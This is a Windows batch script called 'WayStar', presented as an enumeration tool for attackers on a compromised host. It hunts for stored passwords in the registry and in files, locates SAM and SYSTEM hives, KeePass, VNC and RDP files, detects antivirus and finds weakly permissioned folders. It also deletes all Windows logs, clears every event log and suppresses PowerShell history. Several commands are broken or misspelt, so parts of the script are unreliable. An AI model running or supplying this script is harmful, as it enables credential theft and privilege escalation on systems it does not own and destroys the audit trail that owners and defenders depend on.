:: WayStar by SYN-3r

@echo off

:: color variables
SET red=color 04
SET gray=color 08
SET black=color 00
SET green=color 0a
SET yellow=color 06
SET blue=color 09
SET magenta=color 0c
SET cyan=color 03
SET white=color 0f
SET blink=color 0f
SET normal=color

echo /-----------------------------------------------------------------------------\\
echo ^|                           %white% %blink%  ⭐%normal%  %cyan% WayStar by SYN-3r %white% %blink%  ⭐%normal%                            %normal% ^|
echo ^|                       %cyan% A Windows Enummeration Script                         %normal% ^|
echo ^|-----------------------------------------------------------------------------^|
echo ^|  %magenta% , : ^| ^| %cyan% ^| ^|:  %green% ^|^|  :     %magenta% ,  :  ^|  ^|+%cyan% ^|: ^| :%green%  : :^|   .        %normal% ,%cyan%               . %normal% ^|
echo ^|      %magenta% , : ^| %cyan% :^|  ^|^|  %green% ^|:  :    %magenta% ,  ^|  ^| :%cyan% ^| : ^| : ^|%green% :   %cyan% ^|  %white% %blink%  .%normal%                     %magenta% : %normal% ^|
echo ^|         %magenta% %white% %blink%  .%normal% %magenta% ' ':  %cyan% ^|^|  ^|:  %green% ^|  '%magenta%        , ^|^| %cyan% ^| : ^| %green% ^|: : ^|   .%normal%   ,           %normal% %white% %blink%  .%normal%    %magenta% :. %normal% ^|
echo ^|                %magenta% ,'  ^|^|  %cyan% ^|  ' ^|   %normal% *%magenta%     , : ^| ^| %cyan% :^| ^|%normal% *%green% ^|  :   %magenta% :               %cyan% :%green% ^| %normal% ^|
echo ^|        *    *       %magenta% ,  ^|  : %cyan% :  ^|  %green% . %magenta%      , ' :^| ^| %cyan% :^| . %green% : :         %normal% *%cyan%    :.%green% ^|^| %normal% ^|
echo ^|             %white% %blink%  .%normal% ,           %magenta%  ^| ^|  %cyan% ^|  %green% : .:^|  %magenta%      , ^| ^|%cyan% ^| ^| : %green% ^|: ^|          ^| ^|^| %normal% ^|
echo ^|      '          %white% %blink%  .%normal%          %magenta% + ,  ^|  %green% :  .: . %magenta%         '^| ^| %cyan% : :^|%green%  :    %normal% %white% %blink%  .%normal%    %magenta% ^|:%cyan% ^| ^|%green% ^| %normal% ^|
echo ^|         %white% %blink%  .%normal%                  %white% %blink%  .%normal%     %magenta% , %cyan% *^|  ^|%green% ^| : %normal%       ,%magenta%     ^| ^| %cyan% :^| %green% ^| :      %magenta% ^|:%cyan% ^| %green% ^|  %normal% ^|
echo ^| %white% %blink%  .%normal%                 %white% %blink%  .%normal%           %white% %blink%  .%normal%         %magenta% ^|^| %green% ^|.: %normal% *%magenta%           ^| ^|%cyan% ^| : %green% :     %magenta% :^|%cyan% ^|^|%green% ^|   %normal% ^|
echo ^|        %white% %blink%  .%normal%             %white% %blink%  .%normal%    . *    %white% %blink%  .%normal%    %white% %blink%  .%normal%   %magenta% , ^|^|^|.  %normal% +        +%magenta%  '^| %cyan% ^|^|%green% ^|  %white% %blink%  .%normal%   %magenta% ^|^|%cyan% ,%green% ^|    %normal% ^|
echo ^|     %white% %blink%  .%normal%              *              %white% %blink%  .%normal%      %magenta% +:,^|%green% ^| %magenta%             %white% %blink%  .%normal%  %magenta% ^|^|%cyan% ^|^|  %magenta% :%white% %blink%  .%normal% %magenta% ^|%cyan% ^|,%green% ^|     %normal% ^|
echo ^| +                      %white% %blink%  .%normal%                 %magenta% ..%magenta% ^|%cyan% ^|%normal% *%magenta%           . ^| :%cyan% ,^|%green% ^|+ %magenta% ^|^|^|%cyan% ,%green% ^|      %normal% ^|
echo ^|     %white% %blink%  .%normal%                          +      %magenta% : %cyan% ^|^|%green% ^|,%magenta%         .^| :^| %cyan% ^| ^| %green% ^|.^| %magenta% ^|%cyan% ^|%green% ,     %normal% %white% %blink%  .%normal%   %normal% ^|
echo ^|       *     +   '               +  %magenta% :^|%green% ^| ^|, %magenta%     :.%cyan% +. ^|^|%green%  ^|^| ^| %magenta% ^|:,%cyan% ^|^| %green% ,          %normal% ^|
echo ^|                            %white% %blink%  .%normal%       %magenta% .^|%green% ^|, .%magenta%     ..^|%cyan% ^| ^| %green% ^|: %cyan% ', ,^| %magenta% ^| %cyan% ^|%green% ,  %normal% +         %normal% ^|
echo ^|  %white% %blink%  .%normal%        + +                      %magenta% ^|^|  %magenta%       ^|^|%cyan% ^|: %green% ,       %magenta% :%cyan% ^| %green% ^|               %normal% ^|
echo ^|              +         %white% %blink%  .%normal%       %white% %blink%  .%normal%     %magenta% ^| %green% .  %magenta%     ,^|%cyan% ^|^|%green% .:      %magenta% .%cyan% ^|%green% ^|    %normal% %white% %blink%  .%normal%       %white% %blink%  .%normal%     ,%normal% ^|
echo ^|          '                           %magenta% ,^|%green% . %magenta%   %white% %blink%  .%normal% %magenta%   ,:%cyan% ^|%green% ^|^|   %normal% + %magenta% ^|%cyan% ^|%green% '     %normal% ,           %normal% ^|
echo ^|  %gray% __    %normal% +      *                         %green% ,'%magenta%        ,%cyan% '%green% ^|.    %magenta% ,%green% :                 %normal% ^|
echo ^|%gray% ^,  ,---^^^----....____,..^---,^,,----.,.___          %cyan% ,%green% .    %cyan% ,%green% .  .    %gray% ____,.,-%normal% ^|
echo ^|%gray% ::::___,---^^,---^   ^  ^ ^::::::::^   ::::^^^---,..___ __,..---^^::::::::   %normal% ^|
echo ^|%gray% --^ ::::::  :^::::::::::::::::::::: ^  ::::::::::::::::: :::  ,,--..,__ :::  %normal% ^|
echo \-----------------------------------------------------------------------------/
echo.
echo.

:: BEGINNING OF SCRIPT
echo %blue% ..................................................... %normal%
echo %green%             SITUATIONAL AWARENESS %normal
echo %blue% ..................................................... %normal%
echo .
echo %cyan% Current user: %normal%
echo %USERNAME%
echo.

echo %cyan% Does powershell exist? %normal%
:: check to see if powershell exists
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion 
echo.

echo %cyan% Date of last reboot: %normal%
dir /a c:\pagefile.sys
echo.

echo %cyan% Commands run at startup: %normal%
wmic startup get caption,command

echo %blue% ..................................................... %normal%
echo %green%                    OS INFORMATION %normal
echo %blue% ..................................................... %normal%
echo .

echo %green% Windows  Product Name: %normal%
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductName
echo %green% Windows  Install Date: %normal%
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate
echo %green% Windows  Registered Owner: %normal%
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner
echo %green% Windows  System Root: %normal%
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v SystemRoot
echo.

echo %cyan% Version and system info: %normal%
ver
echo.
systeminfo
echo.
 

echo %blue% ..................................................... %normal%
echo %green%            USERS, ACCOUNTS, AND GROUPS %normal
echo %blue% ..................................................... %normal%
echo .

echo %cyan% Admins: %normal%
net localgroup administrators
echo.

%cyan% Users: %normal%
net users 
echo.
echo %green% Useful Users: %normal%
dsquery * -filter "(objectclass=user)" -attr name dnshostname samaccountname description -limit 0
echo.

echo %cyan% Groups: %normal%
net localgroup
echo.
echo %green% Useful Groups: %normal%
dsquery * -filter "(objectclass=group)" -attr name dnshostname samaccountname description -limit 0
echo.

echo %cyan% Accounts: %normal%
net accounts
echo.

echo %green% Useful Computers: %normal%
dsquery * -filter "(objectclass=computer)" -attr name dnshostname operatingsystem description -limit 0

echo %blue% ..................................................... %normal%
echo %green%                   PASSWORDS %normal
echo %blue% ..................................................... %normal%
echo .

echo %cyan% HKLM and HKCU: %normal%
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul ^| findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query HKLM /f password /t REG_SZ /s /k
reg query HKCU /f password /t REG_SZ /s /k
reg query "HKCU\Software\ORL\WinVNC3\Password" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" 
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" 
reg query HKLM if /fd password /t REG_SZ /s
echo.

:: searches passwords for cleartext paswswords
%cyan% Cleartext Passwords: %normal%
dir /s /b *pass* *cred* *vnc* *.config*
findstr /SI password *.txt


echo %blue% ..................................................... %normal%
echo %green%               SECURITY DETECTION  %normal
echo %blue% ..................................................... %normal%
echo .

echo %red% Antivirus detection: %normal%
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName
echo.

echo %blue% ..................................................... %normal%
echo %green%                SCHED TASKS AND FILES %normal
echo %blue% ..................................................... %normal%
echo .

echo %cyan% Scheduled tasks: %normal%
schtasks /query /fo LIST /v ^| findstr "TaskName Author: Run: User:"
schtasks/query

echo %cyan% SAM and SYSTEM files: %normal%
dir %SYSTEMROOT%\repair\SAM 2>nul
dir %SYSTEMROOT%\System32\config\RegBack\SAM 2>nul
dir %SYSTEMROOT%\System32\config\SAM 2>nul
dir %SYSTEMROOT%\repair\system 2>nul
dir %SYSTEMROOT%\System32\config\SYSTEM 2>nul
dir %SYSTEMROOT%\System32\config\RegBack\system 2>nul
dir /a /b /s SAM.b*
echo.

echo %cyan% Vnc, kdbx, or rdp files: %normal%
dir /a /s /b *.kdbx *vnc.ini *.rdp
echo.


echo %cyan% Folders with weak permissions: %normal%
icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icalcs "C:\Program Files (x86)\*" 2>nul" 2>nul | findstr "(F)" | findstr "Everyone"
icalcs "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
echo.

del %WINDIR%\*.log /a /s /q /f
for /f %a in ('wevtutil el') do @wevtutil cl "%a"

echo %blue% ..................................................... %normal%
echo %green%                 Other Stuff to add %normal
echo %blue% ..................................................... %normal%
echo .




:: display all processes
wmic process get procesid,commandline

:: display logical drives
wmic logicaldisk get description,name


echo %blue% ..................................................... %normal%
echo %green%                     POWERSHELL   %normal%
echo %blue% ..................................................... %normal%
echo .

powershell
SaveNothing
MaximumHistoryCount 0

echo %cyan% Version: %normal%
$psVersionTable
echo.

echo %cyan% Antivirus: %normal%
Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop
echo.

echo %cyan% Credentials: %normal%
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
echo.



